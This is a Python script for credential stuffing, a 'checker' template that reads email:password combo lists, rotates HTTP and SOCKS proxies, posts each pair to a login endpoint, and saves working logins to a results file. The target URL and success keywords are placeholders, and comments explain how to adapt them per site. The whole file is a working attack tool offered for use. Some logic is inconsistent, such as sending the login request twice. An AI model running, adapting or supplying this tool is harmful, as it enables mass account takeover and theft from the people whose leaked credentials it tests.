try:
    import requests
    from bs4 import BeautifulSoup
    from multiprocessing.dummy import Pool
    from multiprocessing import Lock
    from colorama import init, Fore as F
    import json

except ImportError as error:
    print(f"{error.__class__.__name__}: {error} - Please Install Modules using pip install <name>")

if __name__ == '__main__':
    from includes.proxy import ProxySender
    from includes.extra import banner, scrapper, green_box, red_box, info_box
else:
    from .includes.proxy import ProxySender
    from .includes.extra import banner, scrapper, green_box, red_box, info_box



init(convert=True)

lock = Lock()
good = 0
bad = 0
error = 0
checked = 0


class Checker:

    global good, bad, checked, error

    def __init__(self, threads, type_proxy):

        self.process_count = threads
        self.proxy_type = type_proxy
        self.proxy_list = []
        self.combo_list = []

    def list_loader(self):

        load = open('data/lists/combo.txt').readlines()
        loaded = [items.rstrip().strip() for items in load]
        for lines in loaded:
            line_splits = lines.split(':')
            self.combo_list.append({'email': line_splits[0], 'password': line_splits[-1]})

    def proxy_loader(self):

        try:

            if self.proxy_type == 'http':

                load = open('data/lists/http.txt')

            elif self.proxy_type == 'sock4':

                load = open('data/lists/sock4.txt')

            elif self.proxy_type == 'sock5':

                load = open('data/lists/sock5.txt')

            else:
                raise Exception

            loaded = [items.rstrip().strip() for items in load]
            for lines in loaded:
                self.proxy_list.append(lines)

        except:
            print('Error Loading Proxy')

    def request_sender(self, email, password):

        while True:

            try:

                url = "api.example.com"  # Post Url
                proxy = ProxySender(self.proxy_list, self.proxy_type).request()  # Proxy FMT '192.168.0.0:8000'
                data_post = {  # Post Data Will be different for every site.
                    'email': email,
                    'password': password,
                }
                head = {  # Use Headers in case of secure site.
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 OPR/68.0.3618.197',
                }
                timeout_proxy = 3

                # In case of normal Post not json.
                source = requests.post(url, data=data_post, headers=head, proxies=proxy, timeout=timeout_proxy).text

                # In case of Json.
                # Instead of json.dumps you can directly use json parameter as well.
                source = requests.post(url, data=json.dumps(data_post), headers=head, proxies=proxy, timeout=timeout_proxy).content
                source = json.loads(source)

                # Read your response and try to clear the response so that you can search the keywords.
                # You can create list of keywords too.

                success_keyword = '<h5>example 2 </h5>'
                failure_keyword = '<h5>example 2 </h5>'

                if success_keyword in source:
                    lock.acquire()
                    print(green_box + f' Success: {email} - {password}')
                    lock.release()
                    print(
                    f"""
                    Email: {email}
                    PASSW: {password}
----------------------                    
                    """, file=open('results/good.txt', 'a'))
                    break

                elif failure_keyword in source:
                    lock.acquire()
                    print(red_box + f'Failed: {email} - {password}')
                    print(
                        f"""
                                        Email: {email}
                                        PASSW: {password}
----------------------
                                        """, file=open('results/bad.txt', 'a'))
                    lock.release()
                    break

                else:
                    raise Exception  # In case of Captcha

            except:
                continue


    def process(self, list_item):

        email = list_item['email']
        password = list_item['password']
        # Start
        self.request_sender(email, password)


    def main(self):

        self.list_loader()
        self.proxy_loader()
        banner()

        pool = Pool(int(self.process_count))

        try:

            for _ in pool.imap(self.process, self.combo_list):
                pass

        except KeyboardInterrupt:
            print('Stopping Program')
            from sys import exit
            exit(1)

        print('Done !')


print(info_box + 'theads: ')
threads = input()
print(info_box + 'Type: http/sock4/sock5')
proxy_type = input()

Checker(threads, proxy_type).main()


"""
If you want to add counter for accounts you either add it on top title or just add it in every account
print statement.

For Header
import ctypes
ctypes.windll.kernel32.SetConsoleTitleW("My New Title")

"""